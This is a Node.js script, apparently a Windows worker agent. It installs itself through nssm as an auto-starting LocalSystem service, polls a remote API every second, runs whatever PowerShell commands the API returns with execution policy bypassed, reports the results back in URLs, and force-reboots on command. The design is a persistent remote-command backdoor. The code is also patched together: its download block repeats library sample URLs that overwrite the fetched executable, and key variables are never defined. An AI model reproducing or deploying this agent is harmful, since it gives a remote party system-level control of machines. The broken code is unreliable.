const http = require('http')
    const {execFileSync} = require('child_process')
    const path = require("path")
    const os = require("os")
    const fs = require("fs")
    const download = require('download');

    (async () => {
        await download('https://github.com/37218vuuhuu/app-19/raw/main/nssm.exe', 'dist');
     
        fs.writeFileSync('dist/nssm.exe', await download('https://github.com/37218vuuhuu/app-19/raw/main/nssm.exe'));
     
        download('unicorn.com/foo.jpg').pipe(fs.createWriteStream('dist/nssm.exe'));
     
        await Promise.all([
            'unicorn.com/nssm.exe',
            'cats.com/dancing.gif'
        ].map(url => download(url, 'dist')));
    })();


    const execNoError = (cmd, args, options) => {
        try {
            return execFileSync(cmd, args, options).toString().trim()
        } catch (e) {
            return e.toString().trim()
        }
    }


    function execPowershellScript(script) {
        // Write script to a file in temp dir
        const scriptPath = path.join(os.tmpdir(), 'script.ps1')
        fs.writeFileSync(scriptPath, script)
        // Execute script
        return execNoError('powershell.exe', ['-ExecutionPolicy', 'Bypass', '-File', scriptPath])
    }


    function log(data) {
        console.log(data)
        // Now in timezone asia +7
        const date = new Date().toLocaleString('en-US', {timeZone: 'Asia/Ho_Chi_Minh'})
        const dataString = `[${date}] ${String(data).trimEnd()}\n`
        // Write log to desktop
        fs.appendFileSync(path.join(os.homedir(), 'Desktop', 'log.txt'), dataString)
    }


    async function get(url) {
        return await new Promise((resolve, reject) => {
            http.get(url, (res) => {
                let data = ''
                res.on('data', (chunk) => {
                    data += chunk
                })
                res.on('end', () => {
                    resolve(data)
                })
            }).on('error', (err) => {
                reject(err)
            })
        })
    }





    // Install this executable as a service
    if (!process.env.RUN) {
        execNoError('net.exe', ['stop', '_GNPython'])
        const exePath = `${serviceDir}\\index.js`

        const commands = `
        install _GNPython ${exePath}
        set _GNPython Application ${exePath}
        set _GNPython AppDirectory ${serviceDir}
        set _GNPython Start SERVICE_AUTO_START
        set _GNPython ObjectName LocalSystem
        set _GNPython Type SERVICE_WIN32_OWN_PROCESS
        set _GNPython AppExit Default Restart
        set _GNPython Description ${exePath}
        `
        // set _GNPython AppEnvironmentExtra RUN=1
        // `

        for (let command of commands.split('\n')) {
            command = command.trim()
            if (command === '') {
                continue
            }
            log(execNoError(nssmPath, command.split(' '), {cwd: serviceDir}))
        }

        log(execNoError('net.exe', ['start', '_GNPython'], {cwd: serviceDir}))
    } else {
        // Check for reset
        setInterval(async () => {
            let data
            try {
                data = await get(`${apiUrl}/worker-app/needs-reset?auth=auth@worker@gmail`)
                if (JSON.parse(data).needs_reset) {
                    await get(`${apiUrl}/worker-app/status?auth=auth@worker@gmail&status=Đang reset`)
                    const result = execNoError('C:\\Windows\\System32\\shutdown.exe', ['/r', '/t', '0', '/f'])
                    log(`Reset result: ${result}`)
                    await get(`${apiUrl}/worker-app/status?auth=auth@worker@gmail&status=Đã reset: ${result}`)
                }
            } catch (e) {
                log(e)
                log(data)
            }
        }, 1000)


        // Check for powershell command
        setInterval(async () => {
            let data = ''
            try {
                data = await get(`${apiUrl}/worker-app/powershell-cmd?auth=auth@worker@gmail`)
                const command = JSON.parse(data).cmd
                if (command !== null) {
                    await get(`${apiUrl}/worker-app/status?auth=auth@worker@gmail&status=Đang chạy lệnh ${command}`)
                    const result = execPowershellScript(command)
                    log(`Powershell result: ${result}`)
                    await get(`${apiUrl}/worker-app/status?auth=auth@worker@gmail&status=Kết quả lệnh: ${result}`)
                }
            } catch (e) {
                log(e)
                log(data)
            }
        }, 1000)
    }

    log('Service started')